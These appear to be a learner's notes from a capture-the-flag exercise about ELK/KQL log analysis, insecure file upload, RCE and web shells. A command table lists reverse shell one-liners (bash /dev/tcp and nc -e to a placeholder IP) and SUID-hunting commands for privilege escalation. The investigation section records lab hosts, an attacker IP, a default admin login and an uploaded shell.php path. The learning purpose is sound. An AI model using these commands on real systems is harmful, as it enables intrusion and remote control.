******************************************************************************************************************************
                    Day 3 - Even if I wanted to go, their vulnerabilities wouldn't allow it
******************************************************************************************************************************

- Learn about Log analysis and tools like ELK.
- Learn about KQL and how it can be used to investigate logs using ELK.
- Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.

- How to use ELK to analyse the logs of a demonstration web app
- Review Apache2 logs

KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values.
Kibana also allows using Lucene query, an advanced language that supports features such as fuzzy terms (searches for terms that are similar to the one provided)

| Query/Syntax | Description                                                                                     | Example                                   |
|--------------|-------------------------------------------------------------------------------------------------|-------------------------------------------|
| " "          | The two quotation marks are used to search for specific values within the documents. Values in quotation marks are used for exact searches. | "TryHackMe"                               |
| *            | The asterisk denotes a wildcard, which searches documents for similar matches to the value provided. | United* (would return United Kingdom and United States) |
| OR           | This logical operator is used to show documents that contain either of the values provided.    | "United Kingdom" OR "England"            |
| AND          | This logical operator is used to show documents that contain both values.                      | "Ben" AND "25"                           |
| :            | This is used to search the (specified) field of a document for a value, such as an IP address. Note that the field you provide here will depend on the fields available in the index pattern. | ip.address: 10.10.10.10                  |

"" = Exact
* = Wildcard
OR = Either
AND = Both
: = Search the field

File Upload Vulnerabilities

RCE: Uploading a script that the server runs gives the attacker control over it.
XSS: Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker's server.

Examples of abuse through unrestricted file uploads include:

Uploading a script that the server executes, leading to RCE.
Uploading a crafted image file that triggers a vulnerability when processed by the server.
Uploading a web shell and browsing to it directly using a browser.

Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system.

A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it.

For example, attackers could use a web shell to:

Execute commands on the server
Move laterally within the network
Download sensitive data or pivot to other services

a) what your goal is
b) what misconfigurations are present on the system

| Command                                      | Use                                                                                                                                                   |
|----------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| `ls`                                         | Will give you an idea of what files/directories surround you                                                                                         |
| `cat`                                        | A command used to output the contents of documents such as text files                                                                                |
| `pwd`                                        | Will give you an idea of where in the system you are                                                                                                 |
| `whoami`                                     | Will let you know who you are in the system                                                                                                          |
| `hostname`                                   | The system name and potentially its role in the network                                                                                              |
| `uname -a`                                   | Will give you some system information like the OS, kernel version, and more                                                                          |
| `id`                                         | If the current user is assigned to any groups                                                                                                        |
| `ifconfig`                                   | Allows you to understand the system's network setup                                                                                                  |
| `bash -i >& /dev/tcp/<your-ip>/<port> 0>&1`  | A command used to begin a reverse shell via bash                                                                                                     |
| `nc -e /bin/sh <your-ip> <port>`             | A command used to begin a reverse shell via Netcat                                                                                                   |
| `find / -perm -4000 -type f 2>/dev/null`     | Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (often root) |
| `find / -writable -type f 2>/dev/null | grep -v "/proc/"` | Also helpful in privilege escalation attempts used to find files with writable permissions                                                             |



******************************************
                Investigation
******************************************        

frostypines-resorts <<< The focus
wareville-rails

Oct 3rd 11:30 to Oct 3rd 12:00

483 Hits

2 IPs
    10.9.254.186
    10.11.83.34 <<< The focus 

admin@frostpines.thm | admin

http://frostypines.thm/admin/rooms.php
http://frostypines.thm/media/images/rooms/shell.php

http://frostypines.thm

*****************************************************
                Commandline Arguments
*****************************************************

